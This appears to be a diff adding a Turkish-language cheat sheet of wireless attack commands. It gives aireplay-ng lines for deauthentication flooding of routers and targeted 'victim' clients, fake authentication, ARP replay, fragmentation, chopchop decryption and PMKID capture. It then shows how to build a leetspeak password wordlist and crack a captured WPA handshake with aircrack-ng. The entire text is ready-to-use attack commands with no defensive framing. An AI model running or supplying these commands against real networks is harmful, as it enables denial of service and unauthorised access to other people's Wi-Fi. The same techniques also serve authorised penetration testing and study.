@@ -1,0 +1,59 @@
+sudo aireplay-ng -0 "gönderilecek paket" -a "modemin bssid'si" wlan0 #paket saldırısı
+sudo aireplay-ng -0 "gönderilecek paket" -a "modemin bssid'si" -c "hedef cihaz" wlan0 #hedef cihaza yönelik paket saldırısı
+------------------------------------------------------------------------------------
+# Temel fake auth (süresiz)
+sudo aireplay-ng -1 0 -a "modemin_bssid'si" -h "saldıran_cihaz_bssid'si" wlan0
+
+# Belirli aralıklarla yeniden deneme (60 saniye)                                        🔐 FAKE AUTHENTICATION
+sudo aireplay-ng -1 60 -a "modemin_bssid'si" -h "saldıran_cihaz_bssid'si" wlan0
+
+# Belirli paket sayısında yeniden auth (10 paket)
+sudo aireplay-ng -1 0 -q 10 -a "modemin_bssid'si" -h "saldıran_cihaz_bssid'si" wlan0
+------------------------------------------------------------------------------------
+# Sürekli deauth (sınırsız paket)
+sudo aireplay-ng -0 0 -a "modemin_bssid'si" wlan0
+
+# Belirli sayıda deauth paketi (10 paket)                                               🔴 DEAUTH SALDIRISI 
+sudo aireplay-ng -0 10 -a "modemin_bssid'si" wlan0
+
+# Belirli istemciyi hedefleme (10 paket)
+sudo aireplay-ng -0 10 -a "modemin_bssid'si" -c "hedef_istemci_bssid'si" wlan0
+------------------------------------------------------------------------------------
+# ARP paketlerini yakala ve replay et
+sudo aireplay-ng -3 -b "modemin_bssid'si" -h "saldıran_cihaz_bssid'si" wlan0            📊 ARP REQUEST REPLAY
+------------------------------------------------------------------------------------
+# Interaktif paket seçimi
+sudo aireplay-ng -2 -b "modemin_bssid'si" -h "saldıran_cihaz_bssid'si" wlan0            🎭 INTERACTIVE PACKET REPLAY
+------------------------------------------------------------------------------------
+# Key stream elde etmek için
+sudo aireplay-ng -5 -b "modemin_bssid'si" -h "saldıran_cihaz_bssid'si" wlan0            🧪 FRAGMENTATION ATTACK
+------------------------------------------------------------------------------------
+# Şifreli paketi decrypt et
+sudo aireplay-ng -4 -b "modemin_bssid'si" -h "saldıran_cihaz_bssid'si" wlan0            🎯 CHOPCHOP ATTACK
+------------------------------------------------------------------------------------
+# PMKID yakalama denemesi
+sudo aireplay-ng -D -b "modemin_bssid'si" -h "saldıran_cihaz_bssid'si" wlan0            🆕 PMKID SALDIRISI
+------------------------------------------------------------------------------------
+# -a "modemin_bssid'si"          # Hedef modem BSSID (MAC adresi)
+# -h "saldıran_cihaz_bssid'si"   # Saldıran adaptör BSSID (Kendi MAC'iniz)
+# -c "hedef_istemci_bssid'si"    # Hedef istemci BSSID (Kurban cihaz MAC'i)
+
+# -1    # Fake authentication (Sahte kimlik doğrulama)
+# -0    # Deauthentication (Bağlantı kesme)  
+# -3    # ARP replay (ARP paketi tekrarı)
+# -2    # Interactive (Etkileşimli paket seçimi)
+# -5    # Fragmentation (Parçalama saldırısı)
+# -4    # Chopchop (Şifre çözme saldırısı)
+# -D    # PMKID (WPA/WPA2 PMKID yakalama)
+------------------------------------------------------------------------------------
+/opt/Wordlister konumuna git #wordlister tool'unu indir
+python3 wordlister.py --input "girdilerin olduğu dosya" --output "çıktıların olacağı dosya" --perm "kaç kelime birleştirilecek" --min "minimum karakter sayısı" --max "maksimum karakter sayısı" --leet --append ! --prepend ? --sort
+--leet e => 3 a => 4 gibi algoritmalar kullanır
+--append sona ekleme
+--prepend başa ekleme 
+--sort alfabetik olarak sıralama
+--cap her kelimenin ilk harfini büyük yapar
+--up tümünü büyük yapar
+süper örnek:
+python3 wordlister.py --input input.txt --output input_full_wordlist.txt --perm 3 --min 8 --max 25 --leet --cap --up --append "!" --append "?" --append "2023" --append "123" --prepend "#" --prepend "$" --prepend "&" --sort
+aircrack-ng "handshake dosyası"-w "wordlist dosyası" 
